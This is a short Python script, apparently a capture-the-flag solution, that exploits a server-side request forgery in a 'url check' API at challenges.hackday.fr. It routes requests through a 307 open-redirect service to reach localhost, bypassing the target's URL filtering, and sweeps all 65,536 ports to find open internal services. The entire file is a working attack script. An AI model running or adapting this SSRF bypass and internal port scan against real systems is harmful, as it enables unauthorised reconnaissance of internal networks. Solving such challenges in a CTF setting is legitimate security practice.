from requests import post
from pwn import log

TARGET = "http://challenges.hackday.fr:43244/api/check"
PAYLOAD = "https://307.r3dir.me/--to/?url=http://localhost"

def main():
    progress = log.progress("Testing port: ")

    for port in range(0, 65536):
        progress.status(str(port))

        response = post(TARGET, data={
            "showBody": "on",
            "url": f"{PAYLOAD}:{port}/"
        }).json()

        if(not response["online"] == False):
            log.success(f"Port {port} is open")


if __name__ == "__main__":
    log.info(f"Targeting {TARGET}")
    log.info(f"Using payload {PAYLOAD}")
    print()
    main()
